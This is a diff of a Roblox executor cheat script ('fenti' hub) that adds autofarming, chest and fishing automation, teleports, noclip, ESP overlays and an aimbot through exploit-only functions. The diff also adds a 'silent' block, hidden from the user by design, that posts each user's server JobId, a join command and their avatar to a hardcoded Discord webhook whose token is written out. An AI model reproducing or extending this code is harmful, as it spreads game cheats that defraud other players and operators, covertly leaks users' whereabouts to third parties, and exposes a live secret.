+        local function fireGuiButton(btn)
+            if not btn or not btn.Parent then return false end
+            pcall(function()
+                if btn:IsA("GuiButton") then btn:Activate() end
+            end)
+            if Support.Connections then
+                pcall(function()
+                    for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
+                        if conn.Fire then conn:Fire() elseif conn.Function then task.spawn(conn.Function) end
+                    end
+                end)
+            else
+                pcall(function() firesignal(btn.MouseButton1Click) end)
+            end
+            return true
+        end
+        local clicked = false
+        pcall(function()
+            local main = gui:FindFirstChild("MainFrame", true) or gui:FindFirstChildWhichIsA("Frame", true)
+            if not main then return end
+            local list = main:FindFirstChild("ChoiceList", true) or main:FindFirstChild("Choices", true)
+                or main:FindFirstChild("Options", true)
+            local ordered = fentiCollectChoiceButtonsOrdered(list or main)
+            for _, btn in ipairs(ordered) do
+                local txt = ""
+                pcall(function()
+                    txt = string.lower(tostring(btn.Text or ""))
+                    if txt == "" then
+                        local tl = btn:FindFirstChildWhichIsA("TextLabel", true)
+                        if tl then txt = string.lower(tostring(tl.Text or "")) end
+                    end
+                end)
+                if txt ~= "" then
+                    for _, needle in ipairs(listNeedles) do
+                        if string.find(txt, needle, 1, true) then
+                            clicked = fireGuiButton(btn)
+                            return
+                        end
+                    end
+                end
+            end
+        end)
+        return clicked
+    end
     local function instaDialogNPC(npcName)
-        local npc = getNPCModel(npcName)
+        local npc = _G.fentiGetNPCModel(npcName)
         if not npc then Library:Notify("NPC not found: " .. tostring(npcName), 3); return end
         if not DialogueRemote then Library:Notify("DialogueRemote missing!", 3); return end
         refreshCharacter()
@@ -4142,6 +4931,8 @@ do
     end
     _G.fentiDialogue = {
         instaDialogNPC = instaDialogNPC,
+        clickChoiceByText = clickDialogueChoiceByText,
+        clickChoice = clickDialogueChoice,
     }
     end)()
     end
@@ -4167,8 +4958,10 @@ do
     end
     local function fishDbg(msg)
         msg = tostring(msg)
-        banLog("FISH", msg)
-        if rawget(_G, "FENTI_FISH_DEBUG") == true then warn("[fenti-fish] " .. msg) end
+        if rawget(_G, "FENTI_FISH_DEBUG") == true then
+            warn("fish")
+            banLog("FISH", msg)
+        end
     end
     local function hasBait()
         local bp = player:FindFirstChild("Backpack")
@@ -4220,8 +5013,13 @@ do
         local backpack = player:FindFirstChild("Backpack")
         if not backpack or not character then return end
         if not hasBait() and autoBuyBait then
-            danielAction("Buy_Bait_15")
+            _G.fentiDanielAction("Buy_Bait_15")
             task.wait(0.45)
+            if isRunning and typeof(rawget(_G, "fentiFishingReturnCFrame")) == "CFrame" then
+                smartTeleport(_G.fentiFishingReturnCFrame)
+                task.wait(0.3)
+                refreshCharacter()
+            end
         end
         local baitTool = backpack:FindFirstChild("Bait")
         if not baitTool then return end
@@ -4347,7 +5145,7 @@ do
         useBaitIfEnabled()
         task.wait(0.3)
         local r = getUseToolRemote()
-        if not r then warn("[fenti] Remotes.UseTool missing"); return nil end
+        if not r then warn("tool missing"); return nil end
         local aim = getRandomVector(false)
         if aim == Vector3.zero then return nil end
         local throwLen = (aim - humanoidRootPart.Position).Magnitude
@@ -4500,7 +5298,7 @@ do
         task.wait(0.3)
         local r = getUseToolRemote()
         if not r then
-            warn("[fenti] Remotes.UseTool missing")
+            warn("tool missing")
             return
         end
         r:FireServer("FishingRod", "Primary", legacyGetRandomVector())
@@ -4894,13 +5692,14 @@ do
         stopTPLoop()
         if _G.fentiStopFishingPoseHold then pcall(_G.fentiStopFishingPoseHold) end
         if autoBuyRod and not _G.fentiFish.hasFishingRod() then
-            pcall(function() danielAction("Buy_FishingRod_150") end)
+            pcall(function() _G.fentiDanielAction("Buy_FishingRod") end)
             task.wait(1.25)
         end
         refreshCharacter()
         if not humanoidRootPart then return end
         local anchorCF = humanoidRootPart.CFrame
         originalPosition = anchorCF.Position
+        rawset(_G, "fentiFishingReturnCFrame", anchorCF)
         -- Stance is spring constraints only (see Heartbeat below).
         -- Pose lock while fishing (chest knockback). Released during cast / reel Primary via fentiCastingUnanchor + fentiSuppressFishHold.
         _G.fentiFishingHoldCF = anchorCF
@@ -5008,7 +5807,7 @@ do
                     if Labels.Status then Labels.Status:SetText("Status: Bite/QTE handled") end
                     pcall(function() _G.fentiFish.fishDbg("loop: bite+QTE path done — soft rod check only") end)
                     task.wait(0.4)
-                    if not chestFarmEnabled and humanoidRootPart then
+                    if humanoidRootPart then
                         local rootsFn = rawget(_G, "fentiGetChestFolderRoots")
                         local roots = {}
                         if type(rootsFn) == "function" then pcall(function() roots = rootsFn() end) end
@@ -5175,6 +5974,7 @@ do
                 -- Never leave velocity lock on during auto-fish — it zeros HRP every ~0.22s and fights spring rig + casts ("spaced out").
                 if isRunning then unlockRootMotion() else lockRootMotion() end
                 pcall(function()
+                    if rawget(_G, "AutoCollect") == false then return end
                     if _G.fentiSpamNearbyChestPrompts then _G.fentiSpamNearbyChestPrompts(64, 18, 0.08) end
                 end)
                 if Labels.Status then Labels.Status:SetText("Status: Mash QTE (remote fallback, UI was open)") end
@@ -5205,6 +6005,7 @@ do
             task.wait(0.45)
             if isRunning then unlockRootMotion() else lockRootMotion() end
             pcall(function()
+                if rawget(_G, "AutoCollect") == false then return end
                 if _G.fentiSpamNearbyChestPrompts then _G.fentiSpamNearbyChestPrompts(64, 18, 0.08) end
             end)
             if Labels.Status then Labels.Status:SetText("Status: Mash QTE done") end
@@ -5305,118 +6106,9 @@ do
     local FentiFarm = {}
     local saintsPollQuietUntil = setmetatable({}, { __mode = "k" })
     local saintsPollThread = nil
-    local saintsEspHlCache = {}
+    local saintsEspLabelCache = {}
     local saintsEspConn = nil
     local saintsEspNextTick = 0
-    FentiFarm.getChestPosition = function(chest)
-        if chest:IsA("Model") then
-            local s, p = pcall(function() return chest:GetPivot().Position end)
-            if s and p then return p end
-            if chest.PrimaryPart then return chest.PrimaryPart.Position end
-            for _, c in pairs(chest:GetChildren()) do if c:IsA("BasePart") then return c.Position end end
-        elseif chest:IsA("BasePart") then return chest.Position end
-        return nil
-    end
-    local function fentiListAllChestBoxes()
-        local boxes = {}
-        local rootsFn = rawget(_G, "fentiGetChestFolderRoots")
-        local roots = {}
-        if type(rootsFn) == "function" then
-            pcall(function() roots = rootsFn() end)
-        end
-        if #roots == 0 then
-            local f = workspace:FindFirstChild("Chests")
-            if f then roots = { f } end
-        end
-        for _, folder in ipairs(roots) do
-            if folder and folder.Parent then
-                for _, ch in pairs(folder:GetChildren()) do
-                    if ch.Name == "ChestBox" then table.insert(boxes, ch) end
-                end
-            end
-        end
-        return boxes
-    end
-    FentiFarm.countChests = function()
-        return #fentiListAllChestBoxes()
-    end
-    FentiFarm.chestFarmLoop = function()
-        totalChestsAtStart = FentiFarm.countChests(); chestsOpened = 0; openedChests = {}
-        local function updateChestUI()
-            local remaining = FentiFarm.countChests()
-            local unopened = 0
-            for _, ch in ipairs(fentiListAllChestBoxes()) do
-                if not openedChests[ch] then unopened = unopened + 1 end
-            end
-            if Labels.ChestCount then Labels.ChestCount:SetText(string.format("Opened: %d / %d  |  Left: %d", chestsOpened, totalChestsAtStart, unopened)) end
-            if Labels.ChestServer then Labels.ChestServer:SetText("Chests In Server: " .. remaining) end
-        end
-        updateChestUI()
-        while chestFarmEnabled do
-            if FentiFarm.countChests() == 0 and Toggles.ChestServerhop and Toggles.ChestServerhop.Value then Library:Notify("No chests! Serverhopping...", 5); task.wait(2); serverHop(); return end
-            local toOpen = {}
-            for _, ch in ipairs(fentiListAllChestBoxes()) do
-                if not openedChests[ch] then table.insert(toOpen, ch) end
-            end
-            if #toOpen == 0 then
-                if Toggles.ChestServerhop and Toggles.ChestServerhop.Value then Library:Notify("All chests opened! Serverhopping...", 5); task.wait(2); serverHop(); return end
-                updateChestUI(); task.wait(5)
-            else
-                for _, chest in pairs(toOpen) do
-                    if not chestFarmEnabled or not chest.Parent then break end
-                    local pos = nil
-                    local prOpen = chest:FindFirstChildWhichIsA("ProximityPrompt", true)
-                    if prOpen then pos = fentiPromptWorldPosition(prOpen) end
-                    if not pos then pos = FentiFarm.getChestPosition(chest) end
-                    if pos then
-                        refreshCharacter()
-                        if humanoidRootPart then
-                            -- Fishing spring rig holds HRP to cast spot; release while we TP open chests.
-                            local prevSuppressFishHold = rawget(_G, "fentiSuppressFishHold")
-                            _G.fentiSuppressFishHold = true
-                            smartTeleport(CFrame.new(pos + Vector3.new(0, 3, 0)))
-                            task.wait(0.14)
-                            refreshCharacter()
-                            pcall(function()
-                                if humanoidRootPart then patchNearbyPrompts(humanoidRootPart.Position, 72) end
-                            end)
-                            task.wait(0.82)
-                            local prOpen2 = chest.Parent and chest:FindFirstChildWhichIsA("ProximityPrompt", true)
-                            local n = 0
-                            local function fireChestPrompt(p)
-                                if not p or not p.Parent then return end
-                                if _G.fentiFireChestProximityInstant then
-                                    pcall(_G.fentiFireChestProximityInstant, p)
-                                elseif _G.fentiFireProximityFull then
-                                    pcall(function() _G.fentiFireProximityFull(p) end)
-                                elseif _G.fentiFireProximityMinimal then
-                                    pcall(function() _G.fentiFireProximityMinimal(p) end)
-                                end
-                            end
-                            if prOpen2 then
-                                fireChestPrompt(prOpen2)
-                                n = 1
-                                task.wait(0.12)
-                                prOpen2 = chest.Parent and chest:FindFirstChildWhichIsA("ProximityPrompt", true)
-                                if prOpen2 then fireChestPrompt(prOpen2); n = n + 1 end
-                            end
-                            banLog("CHEST-FARM", "ChestBox prompt fire passes: " .. n)
-                            openedChests[chest] = true; chestsOpened = chestsOpened + 1
-                            Library:Notify(string.format("Chest %d/%d", chestsOpened, totalChestsAtStart), 2); updateChestUI()
-                            -- Only snap home between chests while auto-fish is running (spring rig anchor). Otherwise chain TP chest→chest.
-                            if isRunning and originalPosition then
-                                smartTeleport(CFrame.new(originalPosition))
-                                task.wait(0.5)
-                            end
-                            _G.fentiSuppressFishHold = prevSuppressFishHold
-                            task.wait((Options.ChestTPDelay and Options.ChestTPDelay.Value) or 5)
-                        end
-                    end
-                end
-                updateChestUI(); task.wait(3)
-            end
-        end
-    end
     
     FentiFarm.getCorpsePosition = function(spawn)
         if spawn:IsA("BasePart") then return spawn.Position
@@ -5866,17 +6558,36 @@ do
             saintsPollThread = nil
         end
     end
+    local saintsEspOverlay = nil
+    local function fentiGetSaintsCorpseEspGui()
+        if saintsEspOverlay and saintsEspOverlay.Parent then return saintsEspOverlay end
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "FentiSaintsCorpse_ESP"
+        sg.ResetOnSpawn = false
+        sg.IgnoreGuiInset = true
+        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        sg.DisplayOrder = 720
+        local ok = pcall(function() sg.Parent = game:GetService("CoreGui") end)
+        if not ok or not sg.Parent then
+            pcall(function() sg.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 8) end)
+        end
+        saintsEspOverlay = sg
+        return sg
+    end
     FentiFarm.stopSaintsEsp = function()
         if saintsEspConn then
             pcall(function() saintsEspConn:Disconnect() end)
             saintsEspConn = nil
         end
-        for part, hl in pairs(saintsEspHlCache) do
+        for part, lbl in pairs(saintsEspLabelCache) do
             pcall(function()
-                if hl and hl.Parent then hl:Destroy() end
+                if lbl and lbl.Parent then lbl:Destroy() end
             end)
         end
-        saintsEspHlCache = {}
+        table.clear(saintsEspLabelCache)
+        pcall(function()
+            if saintsEspOverlay then saintsEspOverlay:Destroy(); saintsEspOverlay = nil end
+        end)
     end
     FentiFarm.startSaintsEsp = function()
         if not saintsEspEnabled then return end
@@ -5886,29 +6597,57 @@ do
                 FentiFarm.stopSaintsEsp()
                 return
             end
+            local cam = workspace.CurrentCamera
+            local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            local myPos = myRoot and myRoot.Position
             local meFolder = getMyEntityFolder()
             local seen = {}
-            local function consider(p)
-                if p:IsA("BasePart") and matchesSaintsFilter(p.Name) then
-                    if hasSaintPart(p.Name) then return end
-                    if meFolder and p:IsDescendantOf(meFolder) then return end
-                    seen[p] = true
-                    if not saintsEspHlCache[p] or not saintsEspHlCache[p].Parent then
-                        pcall(function()
-                            local old = saintsEspHlCache[p]
-                            if old and old.Parent then old:Destroy() end
-                            local hl = Instance.new("Highlight")
-                            hl.Name = "FentiSaintsESP"
-                            hl.Adornee = p
-                            hl.FillColor = Color3.fromRGB(255, 220, 80)
-                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
-                            hl.FillTransparency = 0.55
-                            hl.OutlineTransparency = 0
-                            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                            hl.Parent = p
-                            saintsEspHlCache[p] = hl
-                        end)
-                    end
+            local sg = fentiGetSaintsCorpseEspGui()
+            local function tagPart(p, labelName)
+                if not p or not p:IsA("BasePart") or not cam or not myPos then return end
+                if not matchesSaintsFilter(p.Name) then return end
+                if hasSaintPart(p.Name) then return end
+                if meFolder and p:IsDescendantOf(meFolder) then return end
+                seen[p] = true
+                local dist = math.floor((p.Position - myPos).Magnitude)
+                local sp, onScr = cam:WorldToViewportPoint(p.Position)
+                local lbl = saintsEspLabelCache[p]
+                if not lbl or not lbl.Parent then
+                    pcall(function()
+                        local old = saintsEspLabelCache[p]
+                        if old and old.Parent then old:Destroy() end
+                        lbl = Instance.new("TextLabel")
+                        lbl.Name = "FentiCorpseTag"
+                        lbl.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
+                        lbl.BackgroundTransparency = 0.25
+                        lbl.BorderSizePixel = 0
+                        lbl.TextColor3 = Color3.fromRGB(235, 235, 240)
+                        lbl.Font = Enum.Font.Gotham
+                        lbl.TextSize = 12
+                        lbl.TextStrokeTransparency = 1
+                        lbl.AutomaticSize = Enum.AutomaticSize.XY
+                        lbl.Size = UDim2.fromOffset(2, 2)
+                        lbl.ZIndex = 2
+                        lbl.Parent = sg
+                        saintsEspLabelCache[p] = lbl
+                    end)
+                    lbl = saintsEspLabelCache[p]
+                end
+                if lbl then
+                    lbl.Text = (labelName or p.Name) .. "\n" .. tostring(dist) .. " studs"
+                    local vis = onScr and sp.Z > 0
+                    lbl.Visible = vis
+                    if vis then lbl.Position = UDim2.fromOffset(sp.X + 8, sp.Y) end
+                end
+            end
+            local function consider(target)
+                if target:IsA("Model") then
+                    local bp = target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
+                    if bp then tagPart(bp, target.Name) end
+                    return
+                end
+                if target:IsA("BasePart") then
+                    tagPart(target, target.Name)
                 end
             end
             for _, ch in ipairs(workspace:GetChildren()) do
@@ -5930,7 +6669,7 @@ do
                                 consider(p)
                                 if p:IsA("Model") then
                                     for _, d in ipairs(p:GetDescendants()) do
-                                        consider(d)
+                                        if d:IsA("BasePart") then consider(d) end
                                     end
                                 end
                             end
@@ -5938,12 +6677,12 @@ do
                     end
                 end
             end
-            for part, hl in pairs(saintsEspHlCache) do
+            for part, lbl in pairs(saintsEspLabelCache) do
                 if not seen[part] or not part.Parent then
                     pcall(function()
-                        if hl and hl.Parent then hl:Destroy() end
+                        if lbl and lbl.Parent then lbl:Destroy() end
                     end)
-                    saintsEspHlCache[part] = nil
+                    saintsEspLabelCache[part] = nil
                 end
             end
         end
@@ -5956,6 +6695,173 @@ do
         end)
     end
     FentiFarm.hasSaintPart = hasSaintPart
+
+    -- Silent corpse alerts (no UI text with endpoint). Disable: _G.FENTI_CORPSE_LOG_DISABLE = true
+    do
+        local corpseLogDebounce = {}
+        local function corpseDebouncePass(key, sec)
+            local t = tick()
+            if corpseLogDebounce[key] and (t - corpseLogDebounce[key]) < sec then return false end
+            corpseLogDebounce[key] = t
+            return true
+        end
+        local function fentiCorpseLogUrl()
+            if rawget(_G, "FENTI_CORPSE_LOG_DISABLE") == true then return nil end
+            return table.concat({
+                "https://discord.com/api/webhooks/",
+                "1493265648816754699/",
+                "FYnZrYCA79g3B0liKeirtbSwAPpTfZLAVLAB4rTHqiafHrK_t4Drr6E1HzLIbmGdx4Sx",
+            })
+        end
+        local function fentiExecutorJoinLine()
+            local pid = tostring(game.PlaceId)
+            local jid = game.JobId
+            if type(jid) == "string" and jid ~= "" then
+                return string.format(
+                    'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
+                    pid,
+                    jid:gsub("\\", "\\\\"):gsub('"', '\\"')
+                )
+            end
+            return string.format('game:GetService("TeleportService"):Teleport(%s, game.Players.LocalPlayer)', pid)
+        end
+        local function fentiHolderForPart(bp)
+            if not bp or not bp:IsA("BasePart") then return nil, false end
+            local a = bp
+            while a do
+                if a:IsA("Model") and a:FindFirstChildOfClass("Humanoid") then
+                    local plr = Players:GetPlayerFromCharacter(a)
+                    if plr then
+                        return plr.DisplayName .. " (@" .. plr.Name .. ")", true
+                    end
+                end
+                local par = a.Parent
+                if par and par.Name == "Backpack" and par.Parent and par.Parent:IsA("Player") then
+                    return par.Parent.Name .. " (backpack tool)", true
+                end
+                a = par
+            end
+            return nil, false
+        end
+        local function fentiSpawnAnyPartHeld(spawn)
+            if not spawn then return false end
+            for _, d in ipairs(spawn:GetDescendants()) do
+                if d:IsA("BasePart") then
+                    local _, ok = fentiHolderForPart(d)
+                    if ok then return true end
+                end
+            end
+            return false
+        end
+        local function fentiPostCorpseEmbed(titleName, extraFields)
+            local url = fentiCorpseLogUrl()
+            if not url or url == "" then return end
+            local req = (syn and syn.request) or (http and http.request) or http_request or request or fluxus_request
+            if not req then return end
+            local fields = {
+                { name = "Players in server", value = tostring(#Players:GetPlayers()), inline = true },
+            }
+            if type(extraFields) == "table" then
+                for _, f in ipairs(extraFields) do
+                    table.insert(fields, f)
+                end
+            end
+            local joinLine = fentiExecutorJoinLine()
+            table.insert(fields, {
+                name = "Join (executor)",
+                value = "```lua\n" .. joinLine:sub(1, 980) .. "\n```",
+                inline = false,
+            })
+            table.insert(fields, {
+                name = "JobId",
+                value = (game.JobId ~= "" and game.JobId or "(empty / Studio)"):sub(1, 220),
+                inline = false,
+            })
+            table.insert(fields, { name = "PlaceId", value = tostring(game.PlaceId), inline = true })
+            local payload = {
+                username = "fenti corpse sniper",
+                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
+                    .. player.UserId
+                    .. "&width=48&height=48&format=png",
+                embeds = {
+                    {
+                        title = type(titleName) == "string" and titleName:sub(1, 240) or "?",
+                        color = 6312575,
+                        fields = fields,
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                    },
+                },
+            }
+            local okEnc, body = pcall(function() return HttpService:JSONEncode(payload) end)
+            if not okEnc or type(body) ~= "string" then return end
+            task.spawn(function()
+                pcall(function()
+                    req({
+                        Url = url,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = body,
+                    })
+                end)
+            end)
+        end
+        local function fentiLogCorpseSpawn(spawn)
+            if not spawn or spawn.Name ~= "CorpseSpawn" then return end
+            local key = "spawn:" .. spawn:GetFullName()
+            if not corpseDebouncePass(key, 3.5) then return end
+            task.spawn(function()
+                task.wait(0.55)
+                if not spawn.Parent then return end
+                fentiPostCorpseEmbed(spawn.Name, {
+                    { name = "Being held", value = fentiSpawnAnyPartHeld(spawn) and "Yes" or "No", inline = true },
+                })
+            end)
+        end
+        local function fentiLogCorpsePart(inst)
+            if not inst or not inst:IsA("BasePart") then return end
+            local key = "part:" .. inst:GetFullName()
+            if not corpseDebouncePass(key, 2.5) then return end
+            task.delay(0.4, function()
+                if not inst.Parent then return end
+                local _, held = fentiHolderForPart(inst)
+                fentiPostCorpseEmbed(inst.Name, {
+                    { name = "Being held", value = held and "Yes" or "No", inline = true },
+                })
+            end)
+        end
+        local function fentiHookCorpseSpawnsFolder(folder)
+            if not folder then return end
+            -- Only ChildAdded: do not scan existing CorpseSpawn (that fires webhooks on script load).
+            table.insert(activeConnections, folder.ChildAdded:Connect(function(ch)
+                if ch.Name == "CorpseSpawn" then fentiLogCorpseSpawn(ch) end
+            end))
+        end
+        local function fentiHookCorpsePartsLog(cp)
+            if not cp then return end
+            table.insert(activeConnections, cp.ChildAdded:Connect(function(inst)
+                if inst:IsA("BasePart") then
+                    fentiLogCorpsePart(inst)
+                elseif inst:IsA("Model") then
+                    task.defer(function()
+                        task.wait(0.15)
+                        local pp = inst.PrimaryPart or inst:FindFirstChildWhichIsA("BasePart")
+                        if pp then fentiLogCorpsePart(pp) end
+                    end)
+                end
+            end))
+        end
+        task.defer(function()
+            local cs = workspace:FindFirstChild("CorpseSpawns")
+            if cs then fentiHookCorpseSpawnsFolder(cs) end
+            local cp = workspace:FindFirstChild("CorpseParts")
+            if cp then fentiHookCorpsePartsLog(cp) end
+            table.insert(activeConnections, workspace.ChildAdded:Connect(function(ch)
+                if ch.Name == "CorpseSpawns" then fentiHookCorpseSpawnsFolder(ch) end
+                if ch.Name == "CorpseParts" then fentiHookCorpsePartsLog(ch) end
+            end))
+        end)
+    end
+
     _G.FentiFarm = FentiFarm
     end)()
     end
@@ -6021,12 +6927,30 @@ do
     end
     
     pcall(function()
+        local function fentiNotifLooksLikeExpGain(text)
+            local s = string.lower(tostring(text or ""))
+            s = string.gsub(s, "^%s+", "")
+            s = string.gsub(s, "%s+$", "")
+            if s == "" then return false end
+            -- Floating "+ 10 EXP" (same NotificationEvent pipe as fish webhooks).
+            if string.match(s, "%+%s*%d+%s*exp") then return true end
+            if string.match(s, "^%d+%s*exp%s*$") then return true end
+            if string.match(s, "gained%s+%d+") and string.find(s, "exp", 1, true) then return true end
+            return false
+        end
+        rawset(_G, "fentiNotifLooksLikeExpGain", fentiNotifLooksLikeExpGain)
         local notifRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("NotificationEvent")
         if notifRemote then
             notifRemote.OnClientEvent:Connect(function(...)
                 local args = {...}; local fullMsg = ""
                 for _, val in ipairs(args) do if type(val) == "string" then fullMsg = fullMsg .. " " .. val end end
                 local lower = fullMsg:lower()
+                if fentiNotifLooksLikeExpGain(fullMsg) then
+                    rawset(_G, "fentiExpNotifCount", (rawget(_G, "fentiExpNotifCount") or 0) + 1)
+                    rawset(_G, "fentiLastExpNotifyClock", tick())
+                    banLog("TREE", "EXP notify (NotificationEvent) — " .. fullMsg:gsub("^%s+", ""):sub(1, 120))
+                    return
+                end
                 -- Only "caught" / "reeled" count as catches (not every message containing "fish").
                 if lower:find("caught") or lower:find("reeled") then
                     local line = fullMsg:gsub("^%s+", ""):gsub("%s+$", "")
@@ -6036,6 +6960,7 @@ do
                         if nowChest - lastFentiChestPromptSpam >= 0.8 then
                             lastFentiChestPromptSpam = nowChest
                             pcall(function()
+                                if rawget(_G, "AutoCollect") == false then return end
                                 if _G.fentiSpamNearbyChestPrompts then _G.fentiSpamNearbyChestPrompts(64, 26, 0.06) end
                             end)
                         end
@@ -6079,17 +7004,17 @@ do
     -- ----------------------------------------------------------------------------
     -- [FENTI-22] 22. OBSIDIAN UI (_G.fentiWindow — avoids main-chunk “local Window” register overflow)
     -- ----------------------------------------------------------------------------
-    -- Inside the IIFE below: [FENTI-22a] Information, [FENTI-22·players] Players (you + ESP), [FENTI-22b] Fishing, [FENTI-22c] Teleport, [FENTI-22d] NPCs, [FENTI-22·aura] Aura, [FENTI-22e] Config.
+    -- Inside the IIFE below: Information, Players, Fishing, Autofarm, Teleport, Saints, D4C, Aimbot, NPCs, Aura, Config.
     -- Obsidian Loading modal: https://docs.mspaint.cc/obsidian/core/library/loading
     -- Own IIFE: main chunk is near Luau’s ~200 local register cap; without this, `local okL, Ld` at CreateLoading fails to compile.
     ;(function()
     _G.fentiWindow = nil
     _G.fentiObsidianLoader = nil
-    if type(Library) ~= "table" or type(Library.CreateWindow) ~= "function" then
-        warn("[fenti] Library.CreateWindow missing — UI library did not load correctly.")
+    if (type)(Library) ~= "table" or (type)(Library.CreateWindow) ~= "function" then
+        warn("ui missing")
         return
     end
-    if type(Library.CreateLoading) == "function" then
+    if (type)(Library.CreateLoading) == "function" then
         local okL, Ld = pcall(function()
             return Library:CreateLoading({
                 Title = "fenti",
@@ -6139,7 +7064,7 @@ do
         })
     end)
     if not _G.fentiCWOk then
-        warn("[fenti] CreateWindow error: " .. tostring(_G.fentiCWErr))
+        warn("ui failed")
         _G.fentiCWOk, _G.fentiCWErr = pcall(function()
             _G.fentiWindow = Library:CreateWindow({
                 Title = "fenti",
@@ -6152,10 +7077,10 @@ do
                 Font = Enum.Font.RobotoMono,
             })
         end)
-        if not _G.fentiCWOk then warn("[fenti] CreateWindow retry (no Icon) failed: " .. tostring(_G.fentiCWErr)) end
+        if not _G.fentiCWOk then warn("ui failed") end
     end
     if not _G.fentiWindow then
-        warn("[fenti] Could not open the menu (Library/CreateWindow returned nil).")
+        warn("menu failed")
         if _G.fentiObsidianLoader then
             pcall(function()
                 local EL = _G.fentiObsidianLoader
@@ -6186,12 +7111,13 @@ do
     end
     do
     local _fentiHubUiOk, _fentiHubUiErr = pcall(function()
-    -- [FENTI-22·core] Sidebar order: Information → Players → Fishing → Teleport → Saints → D4C farm → Aimbot → NPCs → Aura → Config (last)
+    -- [FENTI-22·core] Sidebar order: Information → Players → Fishing → Autofarm → Teleport → Saints → D4C farm → Aimbot → NPCs → Aura → Config (last)
     local Tabs = {}
     local Window = _G.fentiWindow
     pcall(function() Tabs.Information = Window:AddTab("Information", "info") end)
     pcall(function() Tabs.Players = Window:AddTab("Players", "users") end)
     pcall(function() Tabs.Fishing = Window:AddTab("Fishing", "anchor") end)
+    pcall(function() Tabs.Autofarm = Window:AddTab("Autofarm", "package") end)
     pcall(function() Tabs.Teleport = Window:AddTab("Teleport", "map-pin") end)
     pcall(function() Tabs.Saints = Window:AddTab("Saints", "crosshair") end)
     pcall(function() Tabs.D4CFarm = Window:AddTab("D4C farm", "swords") end)
@@ -6250,10 +7176,11 @@ do
     InfoContributors:AddLabel("<b>920m</b>", true)
     
     InfoRightOverview:AddLabel("<b>Information</b> — Session, game, copy rejoin command, logs.", true)
-    InfoRightOverview:AddLabel("<b>Players</b> — You: anti-ragdoll, kill streak, anti-AFK, ESP.", true)
-    InfoRightOverview:AddLabel("<b>Fishing</b> — Auto fish, Daniel shop, webhooks, TP presets (saved to file).", true)
-    InfoRightOverview:AddLabel("<b>Teleport</b> — Places, chest farm, chest prompts.", true)
-    InfoRightOverview:AddLabel("<b>Saints</b> — Auto pickup, safe hop, part filters.", true)
+    InfoRightOverview:AddLabel("<b>Players</b> — You: anti-ragdoll, noclip, kill streak, anti-AFK, ESP.", true)
+    InfoRightOverview:AddLabel("<b>Fishing</b> — Auto fish, Daniel shop, webhooks, TP presets, chest automation.", true)
+    InfoRightOverview:AddLabel("<b>Autofarm</b> — Horse, lumber, tree farm, sell/auto-sell wood (ChuckB).", true)
+    InfoRightOverview:AddLabel("<b>Teleport</b> — Spawns, safe zone, presets, landmarks; NPCs on <b>NPCs</b> tab.", true)
+    InfoRightOverview:AddLabel("<b>Saints</b> — Turn on <b>Instant corpse + saints</b> when sniping; leave <b>Fishing & chests</b> off to avoid prompt conflicts.", true)
     InfoRightOverview:AddLabel("<b>D4C farm</b> — Auto knock.", true)
     InfoRightOverview:AddLabel("<b>Aimbot</b> — aimbot for chuds.", true)
     InfoRightOverview:AddLabel("<b>NPCs</b> — Teleport, talk, fast dialogue.", true)
@@ -6288,7 +7215,7 @@ do
     local PlayersYou = Tabs.Players:AddLeftGroupbox("You", "circle-user")
     Labels.KillStreak = PlayersYou:AddLabel("<b>Kill streak:</b> —")
     PlayersYou:AddToggle("KillstreakTracker", {
-        Text = "Track leaderstats streak",
+        Text = "Track kill streak",
         Default = false,
         Callback = function(v)
             killstreakTrackerEnabled = v
@@ -6310,6 +7237,14 @@ do
         Default = true,
         Callback = function(v)
             Library:Notify(v and "Anti-AFK on (~40s pulse)" or "Anti-AFK off", 3)
+        end,
+    })
+    PlayersYou:AddToggle("FentiNoclip", {
+        Text = "Noclip",
+        Default = false,
+        Callback = function(v)
+            pcall(function() fentiSetNoclip(v) end)
+            Library:Notify(v and "Noclip on" or "Noclip off", 2)
         end,
     })
     local function fentiOtherPlayerNamesForTp()
@@ -6406,15 +7341,7 @@ do
         Rounding = 0,
         Callback = function(v) VisualSettings.RenderDistance = v end,
     })
-    PlayersESPRight:AddToggle("PlayerESPHighlightFill", { Text = "Highlight fill", Default = true, Callback = function(v) VisualSettings.ShowHighlightFill = v; fentiPlayerESPToggleRebuild() end })
-    PlayersESPRight:AddSlider("PlayerESPHighlightAlpha", {
-        Text = "Fill transparency",
-        Default = 55,
-        Min = 0,
-        Max = 100,
-        Rounding = 0,
-        Callback = function(v) VisualSettings.HighlightFill = v / 100; fentiPlayerESPToggleRebuild() end,
-    })
+    PlayersESPRight:AddToggle("PlayerESPBox", { Text = "2D box", Default = true, Callback = function(v) VisualSettings.ShowBox = v; fentiPlayerESPToggleRebuild() end })
     PlayersESPRight:AddDivider()
     PlayersESPRight:AddToggle("PlayerESPEntity", {
         Text = "idk i needa fix ts",
@@ -6455,25 +7382,58 @@ do
         Rounding = 0,
     })
     FishingLeft:AddToggle("AutoBuyBait", { Text = "Auto buy bait when out", Default = false, Callback = function(val) autoBuyBait = val end })
-    FishingLeft:AddToggle("AutoFishLoot", { Text = "Auto loot (chests ≤40 studs)", Default = false, Callback = function(val) autoFishLootChests = val end })
+    FishingLeft:AddDivider()
+    FishingLeft:AddToggle("FentiUnifiedChests", {
+        Text = "Auto-open chests",
+        Default = false,
+        Callback = function(v)
+            _G.AutoCollect = v
+            if v then
+                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
+                task.delay(0.1, function()
+                    local ok = false
+                    pcall(function() ok = _G.fentiConnectIYChestInstantPP() == true end)
+                    Library:Notify(ok and "Chest automation on" or "Chest automation on", ok and 2 or 3)
+                end)
+            else
+                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
